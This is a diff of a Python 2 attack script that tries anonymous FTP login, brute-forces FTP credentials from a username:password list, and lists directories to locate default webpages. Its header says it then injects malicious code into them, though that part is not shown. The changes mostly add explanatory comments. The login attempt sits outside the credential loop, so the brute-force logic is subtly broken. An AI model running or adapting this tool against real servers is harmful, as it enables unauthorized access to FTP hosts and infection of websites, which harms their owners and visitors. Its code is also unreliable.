@@ -1,48 +1,52 @@
 #!/usr/bin/env python2
 # written by Moses Arocha
 # Program attempts to brute force into an FTP server, gain access, or login in as an anonymous user, 
-# then will inject malicious code into the webpage after it has downloaded
+# then will inject malicious code into the default webpage after it has downloaded
 
+# IMPORTANT: The password list must be formatted liked this " username:password "
 import ftplib
 import optparse
 import time
 
+# Function which attempts to anonymously login to the FTP server using a fake email address so no real information is inserted
 def Anonymous(hostname):
 	try:
 		ftp = ftplib.FTP(hostname)
-		ftp.login('anonymous', 'me@yourdomain.com')
-		print '\n\t[Success] ' + str(hostname) + ' FTP Anonymous Login Succeeded'
-		ftp.quit()
-		return True
+		ftp.login('anonymous', 'me@yourdomain.com')		# The username and password used to login anonymously
+		print '\n\t[Success] ' + str(hostname) + ' FTP Anonymous Login Succeeded'	# Displays if anonymous login successful
+		ftp.quit()							
+		return True						# True: Boolean statement that is either true or false, true if login successful, failure if login has failed
 	except Exception, e:
 		print '\n\t[Failure] ' + str(hostname) + ' FTP Anonymous Login Failed\n'
-		return False
-	
+		return False						# False: Boolean statement that indicates login failure
+			
+# If anonymous function login function fails, it attempts to brute force into the program using a password list.
 def BruteForce(hostname, passwdFile):
-	pF = open(passwdFile, 'r')
-	for line in pF.readlines():
-		time.sleep(1)
-		userName = line.split(':')[0]
-		passWord = line.split(':')[1].strip('\r').strip('\n')
-		print ' [+] Trying : ' + userName +'/' + passWord
+	OpenFile = open(passwdFile, 'r')					# Will open the password file defined by the user
+	for line in OpenFile.readlines():					# Reads each individual line, for one second will sleep
+		time.sleep(1)							# Mandatory so timeout session isn't reached
+		UserName = line.split(':')[0]					# If it is on the left side of the ":" it is the UserName
+		Password = line.split(':')[1].strip('\r').strip('\n')		# If it is on the right side of the ":" it is the Password
+		print ' [+] Trying : ' + UserName +'/' + Password
 	try:
-		ftp = ftplib.FTP(hostname)
-		ftp.login(userName, passWord)
-		print '\n[Success] ' + str(hostname) + ' FTP Login Succeeded: ' + userName + '/' + passWord
+		ftp = ftplib.FTP(hostname)					# Will then attempt to login to the FTP using those credientals
+		ftp.login(UserName, Password)
+		print '\n [Success] ' + str(hostname) + ' FTP Login Succeeded: ' + UserName + ' : ' + Password
 		ftp.quit()
-		return (userName, passWord)
+		return (UserName, Password)
 	except Exception, e:
 		pass
-	print '\n[Failure] Could Not Brute Force FTP Credentials'
-	return (None, None)
+	print '\n [Failure] Could Not Brute Force FTP Credentials'
+	return (None, None)							# Will return nothing if password isn't found
 
+# This function searches for the default page within the server
 def DefaultPage(ftp):
 	try:
 		dirList = ftp.nlst()
 	except:
 		dirList = []
-		print '[Failure] Could Not List Directory Contents'
-		print '[Continue] Skipping To Next Target'
+		print '\n\t[Failure] Could Not List Directory Contents'
+		print '\n\t[Continue] Skipping To Next Target'
 		return
 	retList = []
 	for fileName in dirList:
